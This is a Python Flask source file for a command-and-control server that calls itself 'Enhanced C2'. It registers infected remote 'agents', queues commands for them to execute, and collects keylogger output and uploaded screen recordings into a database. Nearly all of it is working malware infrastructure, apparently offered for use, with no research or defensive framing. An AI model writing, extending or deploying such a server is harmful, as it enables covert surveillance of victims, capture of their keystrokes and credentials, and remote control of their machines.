from flask import Flask, request, jsonify, send_file
import sqlite3
import json
import os
import hashlib
import time
import threading
from datetime import datetime, timedelta
import jwt
from cryptography.fernet import Fernet
import base64
import logging
from logging.handlers import RotatingFileHandler

app = Flask(__name__)

# Configuration
C2_TOKEN = os.environ.get('C2_TOKEN', 'default_c2_token_2024')
JWT_SECRET = os.environ.get('JWT_SECRET', 'jwt_super_secret_2024')
ENCRYPTION_KEY = os.environ.get('ENCRYPTION_KEY', 'encryption_key_32_bytes_long!')

# Setup logging
def setup_logging():
    logger = logging.getLogger('enhanced_c2')
    logger.setLevel(logging.INFO)
    handler = RotatingFileHandler('c2_server.log', maxBytes=5*1024*1024, backupCount=3)
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    return logger

logger = setup_logging()

# Encryption
class EncryptionManager:
    def __init__(self, key):
        self.cipher = Fernet(base64.urlsafe_b64encode(key.ljust(32)[:32].encode()))
    
    def encrypt(self, data):
        if isinstance(data, dict):
            data = json.dumps(data)
        return self.cipher.encrypt(data.encode()).decode()
    
    def decrypt(self, encrypted_data):
        decrypted = self.cipher.decrypt(encrypted_data.encode()).decode()
        try:
            return json.loads(decrypted)
        except:
            return decrypted

encryption = EncryptionManager(ENCRYPTION_KEY)

# Database setup
def init_db():
    conn = sqlite3.connect('runtime/agents.db')
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS agents
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  unique_id TEXT UNIQUE,
                  name TEXT,
                  hostname TEXT,
                  os TEXT,
                  ip TEXT,
                  mac TEXT,
                  last_seen TIMESTAMP,
                  status TEXT DEFAULT 'offline',
                  config TEXT,
                  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  agent_id TEXT,
                  command TEXT,
                  args TEXT,
                  status TEXT DEFAULT 'pending',
                  response TEXT,
                  created_by TEXT,
                  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                  completed_at TIMESTAMP)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS recordings
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  agent_id TEXT,
                  duration INTEGER,
                  status TEXT,
                  file_path TEXT,
                  started_at TIMESTAMP,
                  stopped_at TIMESTAMP)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS keylogs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  agent_id TEXT,
                  log_type TEXT,
                  data TEXT,
                  timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    
    conn.commit()
    conn.close()

def get_db_connection():
    conn = sqlite3.connect('runtime/agents.db')
    conn.row_factory = sqlite3.Row
    return conn

# Authentication
def authenticate(token):
    return token == C2_TOKEN

def create_agent_token(agent_id):
    return jwt.encode({
        'agent_id': agent_id,
        'exp': datetime.utcnow() + timedelta(days=30)
    }, JWT_SECRET, algorithm='HS256')

def verify_agent_token(token):
    try:
        return jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
    except:
        return None

# Agent Management
@app.route('/api/agent/register', methods=['POST'])
def register_agent():
    if not authenticate(request.headers.get('Authorization')):
        return jsonify({'error': 'Unauthorized'}), 401
    
    try:
        data = request.json
        mac_address = data.get('mac', 'unknown')
        hostname = data.get('hostname', 'unknown')
        
        agent_id = hashlib.md5(f"{mac_address}_{hostname}".encode()).hexdigest()[:12]
        
        conn = get_db_connection()
        c = conn.cursor()
        
        c.execute("SELECT * FROM agents WHERE unique_id = ?", (agent_id,))
        existing = c.fetchone()
        
        if existing:
            c.execute('''UPDATE agents SET 
                        last_seen = ?, ip = ?, status = 'online', config = ?
                        WHERE unique_id = ?''',
                     (datetime.now(), data.get('ip'), json.dumps(data.get('config', {})), agent_id))
        else:
            c.execute('''INSERT INTO agents 
                        (unique_id, name, hostname, os, ip, mac, last_seen, status, config)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                     (agent_id, data.get('name', 'Enhanced Agent'), hostname,
                      data.get('os', 'Unknown'), data.get('ip', 'Unknown'),
                      mac_address, datetime.now(), 'online',
                      json.dumps(data.get('config', {}))))
        
        conn.commit()
        c.execute("SELECT * FROM agents WHERE unique_id = ?", (agent_id,))
        agent = c.fetchone()
        conn.close()
        
        agent_token = create_agent_token(agent_id)
        
        logger.info(f"Agent registered: {agent_id} - {hostname}")
        
        return jsonify({
            'agent_id': agent_id,
            'token': agent_token,
            'status': 'registered'
        })
        
    except Exception as e:
        logger.error(f"Registration error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/agent/checkin', methods=['POST'])
def agent_checkin():
    agent_token = request.headers.get('X-Agent-Token')
    if not agent_token:
        return jsonify({'error': 'Missing agent token'}), 400
    
    verified = verify_agent_token(agent_token)
    if not verified:
        return jsonify({'error': 'Invalid token'}), 401
    
    agent_id = verified['agent_id']
    
    try:
        conn = get_db_connection()
        c = conn.cursor()
        
        c.execute('''UPDATE agents SET last_seen = ?, status = 'online' 
                     WHERE unique_id = ?''', (datetime.now(), agent_id))
        
        c.execute('''SELECT * FROM commands 
                     WHERE agent_id = ? AND status = 'pending' 
                     ORDER BY created_at LIMIT 1''', (agent_id,))
        command = c.fetchone()
        
        conn.commit()
        conn.close()
        
        if command:
            return jsonify({
                'has_command': True,
                'command': command['command'],
                'cmd_id': command['id'],
                'args': json.loads(command['args']) if command['args'] else {}
            })
        
        return jsonify({'has_command': False, 'status': 'ok'})
        
    except Exception as e:
        logger.error(f"Checkin error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/agent/response', methods=['POST'])
def agent_response():
    agent_token = request.headers.get('X-Agent-Token')
    if not agent_token:
        return jsonify({'error': 'Missing agent token'}), 400
    
    verified = verify_agent_token(agent_token)
    if not verified:
        return jsonify({'error': 'Invalid token'}), 401
    
    try:
        data = request.json
        conn = get_db_connection()
        c = conn.cursor()
        
        response_data = data.get('response', '')
        if isinstance(response_data, str) and len(response_data) > 1000:
            response_data = encryption.encrypt(response_data)
        
        c.execute('''UPDATE commands SET 
                     status = 'completed',
                     response = ?,
                     completed_at = ?
                     WHERE id = ?''',
                  (response_data, datetime.now(), data.get('cmd_id')))
        
        conn.commit()
        conn.close()
        
        logger.info(f"Command {data.get('cmd_id')} completed by agent {verified['agent_id']}")
        
        return jsonify({'status': 'response_received'})
        
    except Exception as e:
        logger.error(f"Response error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/agent/logs', methods=['POST'])
def receive_logs():
    agent_token = request.headers.get('X-Agent-Token')
    if not agent_token:
        return jsonify({'error': 'Missing agent token'}), 400
    
    verified = verify_agent_token(agent_token)
    if not verified:
        return jsonify({'error': 'Invalid token'}), 401
    
    try:
        data = request.json
        conn = get_db_connection()
        c = conn.cursor()
        
        log_type = data.get('log_type', 'keylog')
        log_data = data.get('data', '')
        
        if len(log_data) > 1000:
            log_data = encryption.encrypt(log_data)
        
        c.execute('''INSERT INTO keylogs (agent_id, log_type, data)
                     VALUES (?, ?, ?)''',
                  (verified['agent_id'], log_type, log_data))
        
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'logs_received'})
        
    except Exception as e:
        logger.error(f"Logs error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/agent/recording_start', methods=['POST'])
def start_recording():
    if not authenticate(request.headers.get('Authorization')):
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.json
    agent_id = data.get('agent_id')
    duration = data.get('duration', 60)
    
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('''INSERT INTO recordings 
                 (agent_id, duration, status, started_at)
                 VALUES (?, ?, ?, ?)''',
              (agent_id, duration, 'recording', datetime.now()))
    
    recording_id = c.lastrowid
    conn.commit()
    conn.close()
    
    result = send_command_to_agent(agent_id, 'start_recording', {
        'duration': duration,
        'recording_id': recording_id
    })
    
    return jsonify({'recording_id': recording_id, 'status': 'started'})

@app.route('/api/agent/recording_stop', methods=['POST'])
def stop_recording():
    if not authenticate(request.headers.get('Authorization')):
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.json
    agent_id = data.get('agent_id')
    recording_id = data.get('recording_id')
    
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('''UPDATE recordings SET status = 'stopping', stopped_at = ?
                 WHERE id = ? AND agent_id = ?''',
              (datetime.now(), recording_id, agent_id))
    conn.commit()
    conn.close()
    
    result = send_command_to_agent(agent_id, 'stop_recording', {
        'recording_id': recording_id
    })
    
    return jsonify({'status': 'stopping'})

@app.route('/api/agent/recording_upload', methods=['POST'])
def upload_recording():
    agent_token = request.headers.get('X-Agent-Token')
    if not agent_token:
        return jsonify({'error': 'Missing agent token'}), 400
    
    verified = verify_agent_token(agent_token)
    if not verified:
        return jsonify({'error': 'Invalid token'}), 401
    
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file uploaded'}), 400
        
        file = request.files['file']
        recording_id = request.form.get('recording_id')
        
        if file.filename == '':
            return jsonify({'error': 'No file selected'}), 400
        
        filename = f"recording_{recording_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
        filepath = os.path.join('recordings', filename)
        os.makedirs('recordings', exist_ok=True)
        file.save(filepath)
        
        conn = get_db_connection()
        c = conn.cursor()
        c.execute('''UPDATE recordings SET status = 'completed', file_path = ?
                     WHERE id = ?''', (filepath, recording_id))
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'uploaded', 'filename': filename})
        
    except Exception as e:
        logger.error(f"Recording upload error: {e}")
        return jsonify({'error': str(e)}), 500

# Command Management
@app.route('/api/agents', methods=['GET'])
def list_agents():
    if not authenticate(request.headers.get('Authorization')):
        return jsonify({'error': 'Unauthorized'}), 401
    
    try:
        conn = get_db_connection()
        c = conn.cursor()
        c.execute("SELECT * FROM agents ORDER BY last_seen DESC")
        agents = c.fetchall()
        conn.close()
        
        agents_list = []
        for agent in agents:
            agents_list.append({
                'id': agent['id'],
                'unique_id': agent['unique_id'],
                'name': agent['name'],
                'hostname': agent['hostname'],
                'os': agent['os'],
                'ip': agent['ip'],
                'last_seen': agent['last_seen'],
                'status': agent['status']
            })
        
        return jsonify({'agents': agents_list, 'count': len(agents_list)})
        
    except Exception as e:
        logger.error(f"List agents error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/command', methods=['POST'])
def send_command():
    if not authenticate(request.headers.get('Authorization')):
        return jsonify({'error': 'Unauthorized'}), 401
    
    try:
        data = request.json
        agent_id = data.get('agent_id')
        command = data.get('command')
        args = data.get('args', {})
        
        conn = get_db_connection()
        c = conn.cursor()
        
        c.execute("SELECT * FROM agents WHERE unique_id = ?", (agent_id,))
        agent = c.fetchone()
        if not agent:
            conn.close()
            return jsonify({'error': 'Agent not found'}), 404
        
        c.execute('''INSERT INTO commands 
                     (agent_id, command, args, status, created_by, created_at)
                     VALUES (?, ?, ?, ?, ?, ?)''',
                  (agent_id, command, json.dumps(args), 'pending',
                   data.get('requester', 'unknown'), datetime.now()))
        
        command_id = c.lastrowid
        conn.commit()
        conn.close()
        
        logger.info(f"Command queued: {command} for agent {agent_id} (ID: {command_id})")
        
        return jsonify({
            'cmd_id': command_id,
            'status': 'queued'
        })
        
    except Exception as e:
        logger.error(f"Send command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/command/<int:cmd_id>', methods=['GET'])
def get_command_result(cmd_id):
    if not authenticate(request.headers.get('Authorization')):
        return jsonify({'error': 'Unauthorized'}), 401
    
    try:
        conn = get_db_connection()
        c = conn.cursor()
        c.execute('''SELECT c.*, a.name as agent_name 
                     FROM commands c 
                     LEFT JOIN agents a ON c.agent_id = a.unique_id 
                     WHERE c.id = ?''', (cmd_id,))
        command = c.fetchone()
        conn.close()
        
        if not command:
            return jsonify({'error': 'Command not found'}), 404
        
        response = command['response']
        if response and response.startswith('gAAAA'):
            try:
                response = encryption.decrypt(response)
            except:
                pass
        
        result = {
            'id': command['id'],
            'agent_id': command['agent_id'],
            'agent_name': command['agent_name'],
            'command': command['command'],
            'status': command['status'],
            'response': response,
            'created_at': command['created_at'],
            'completed_at': command['completed_at']
        }
        
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Get command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/logs/<agent_id>', methods=['GET'])
def get_agent_logs(agent_id):
    if not authenticate(request.headers.get('Authorization')):
        return jsonify({'error': 'Unauthorized'}), 401
    
    try:
        conn = get_db_connection()
        c = conn.cursor()
        c.execute('''SELECT * FROM keylogs 
                     WHERE agent_id = ? 
                     ORDER BY timestamp DESC 
                     LIMIT 100''', (agent_id,))
        logs = c.fetchall()
        conn.close()
        
        logs_list = []
        for log in logs:
            log_data = log['data']
            if log_data.startswith('gAAAA'):
                try:
                    log_data = encryption.decrypt(log_data)
                except:
                    pass
            
            logs_list.append({
                'id': log['id'],
                'log_type': log['log_type'],
                'data': log_data,
                'timestamp': log['timestamp']
            })
        
        return jsonify({'logs': logs_list})
        
    except Exception as e:
        logger.error(f"Get logs error: {e}")
        return jsonify({'error': str(e)}), 500

# Health endpoint
@app.route('/api/health', methods=['GET'])
def health_check():
    try:
        conn = get_db_connection()
        c = conn.cursor()
        c.execute("SELECT COUNT(*) as agent_count FROM agents WHERE status = 'online'")
        online_agents = c.fetchone()['agent_count']
        conn.close()
        
        return jsonify({
            'status': 'healthy',
            'online_agents': online_agents,
            'timestamp': datetime.now().isoformat(),
            'version': '2.0.0'
        })
    except Exception as e:
        return jsonify({'status': 'error', 'error': str(e)}), 500

def send_command_to_agent(agent_id, command, args):
    # This would be implemented to directly communicate with agent
    # For now, we rely on agent check-in system
    return {'status': 'queued'}

def cleanup_old_data():
    while True:
        time.sleep(300)
        try:
            conn = get_db_connection()
            c = conn.cursor()
            
            cutoff = datetime.now() - timedelta(minutes=5)
            c.execute("UPDATE agents SET status = 'offline' WHERE last_seen < ?", (cutoff,))
            
            c.execute('''DELETE FROM keylogs 
                         WHERE timestamp < datetime('now', '-7 days')''')
            
            conn.commit()
            conn.close()
            
            logger.info("Cleanup completed")
            
        except Exception as e:
            logger.error(f"Cleanup error: {e}")

# Perform startup tasks when the module is loaded
os.makedirs('runtime', exist_ok=True)
os.makedirs('recordings', exist_ok=True)
init_db()
cleanup_thread = threading.Thread(target=cleanup_old_data, daemon=True)
cleanup_thread.start()
logger.info("Enhanced C2 Server started successfully")

if __name__ == '__main__':
    # This block is mainly for local development. 
    # Production servers like Gunicorn import the 'app' object directly.
    app.run(host='0.0.0.0', port=5000, debug=False)
